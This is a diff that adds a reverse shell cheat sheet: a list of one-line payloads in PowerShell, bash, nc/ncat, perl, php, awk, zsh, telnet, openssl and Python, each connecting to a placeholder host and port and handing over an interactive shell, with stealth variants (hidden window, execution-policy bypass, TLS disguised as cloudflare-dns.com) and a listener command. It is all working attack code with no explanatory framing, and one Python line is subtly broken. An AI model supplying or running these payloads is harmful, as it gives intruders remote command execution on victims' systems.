@@ -1,0 +1,118 @@
+revshells:
+    powershell:
+        Cleartext:
+            $LHOST = "<host>"; $LPORT = <port>; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()
+
+            powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<host>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
+            powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('<host>', <port>);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"
+
+            C='curl -Ns telnet://<host>:<port>'; $C </dev/null 2>&1 | <shell> 2>&1 | $C >/dev/null
+
+            // udp
+            rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|<shell> -i 2>&1|ncat -u <host> <port> >/tmp/f
+
+            ncat.exe <host> <port> -e <shell>
+
+            ncat <host> <port> -e <shell>
+
+            nc -c <shell> <host> <port>
+
+            nc <host> <port> -e <shell>
+            
+            nc.exe <host> <port> -e <shell>
+
+            perl -e 'use Socket;$i="<host>";$p=<port>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("<shell> -i");};'
+
+            perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"<host>:<port>");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
+
+            php -r '$sock=fsockopen("<host>",<port>);exec("<shell> <&3 >&3 2>&3");'
+
+            php -r '$sock=fsockopen("<host>",<port>);shell_exec("<shell> <&3 >&3 2>&3");'
+
+            php -r '$sock=fsockopen("<host>",<port>);system("<shell> <&3 >&3 2>&3");'
+
+            php -r '$sock=fsockopen("<host>",<port>);passthru("<shell> <&3 >&3 2>&3");'
+
+            php -r '$sock=fsockopen("<host>",<port>);`<shell> <&3 >&3 2>&3`;'
+
+            php -r '$sock=fsockopen("<host>",<port>);popen("<shell> <&3 >&3 2>&3", "r");'
+
+            php -r '$sock=fsockopen("<host>",<port>);$proc=proc_open("<shell>", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
+
+
+
+        TLS: // giving cert error on ncat TLS listener
+            $sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12; $TCPClient = New-Object Net.Sockets.TCPClient('<host>', <port>);$NetworkStream = $TCPClient.GetStream();$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));$SslStream.AuthenticateAsClient('cloudflare-dns.com',$null,$sslProtocols,$false);if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {$SslStream.Close();exit}$StreamWriter = New-Object IO.StreamWriter($SslStream);function WriteToStream ($String) {[byte[]]$script:Buffer = New-Object System.Byte[] 4096 ;$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()};WriteToStream '';while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()
+
+            openssl:
+                mkfifo /tmp/s; <shell> -i < /tmp/s 2>&1 | openssl s_client -quiet -connect <host>:<port> > /tmp/s; rm /tmp/s
+    *nix:
+        awk 'BEGIN {s = "/inet/tcp/0/<host>/<port>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
+
+        zsh -c 'zmodload zsh/net/tcp && ztcp <host> <port> && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'
+
+        TF=$(mktemp -u);mkfifo $TF && telnet <host> <port> 0<$TF | bash 1>$TF
+
+        // udp
+        <shell> -i >& /dev/udp/<host>/<port> 0>&1
+
+        <shell> -i 5<> /dev/tcp/<host>/<port> 0<&5 1>&5 2>&5
+
+        exec 5<>/dev/tcp/<host>/<port>;cat <&5 | while read line; do $line 2>&5 >&5; done
+
+        0<&196;exec 196<>/dev/tcp/<host>/<port>; <shell> <&196 >&196 2>&196
+
+        <shell> -i >& /dev/tcp/<host>/<port> 0>&1
+
+        rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|<shell> -i 2>&1|nc <host> <port> >/tmp/f
+
+    python:
+        <shell>: "bash", "powershell", "zsh", "cmd", etc
+
+        export RHOST="<host>";export RPORT=<port>;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("<shell>")'
+
+        python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<host>",<port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("<shell>")'
+
+        python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<host>",<port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("<port>")'
+
+        python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("<host>",<port>));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("<shell>")'
+
+        windows:
+            ```
+            import os,socket,subprocess,threading;
+            def s2p(s, p):
+                while True:
+                    data = s.recv(1024)
+                    if len(data) > 0:
+                        p.stdin.write(data)
+                        p.stdin.flush()
+
+            def p2s(s, p):
+                while True:
+                    s.send(p.stdout.read(1))
+
+            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+            s.connect(("<host>",<port>))
+
+            p=subprocess.Popen(["<shell>"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
+
+            s2p_thread = threading.Thread(target=s2p, args=[s, p])
+            s2p_thread.daemon = True
+            s2p_thread.start()
+
+            p2s_thread = threading.Thread(target=p2s, args=[s, p])
+            p2s_thread.daemon = True
+            p2s_thread.start()
+
+            try:
+                p.wait()
+            except KeyboardInterrupt:
+                s.close()
+               ```
+
+
+
+Listeners:
+    ncat TLS:
+        sudo ncat --ssl -lvnp <port>
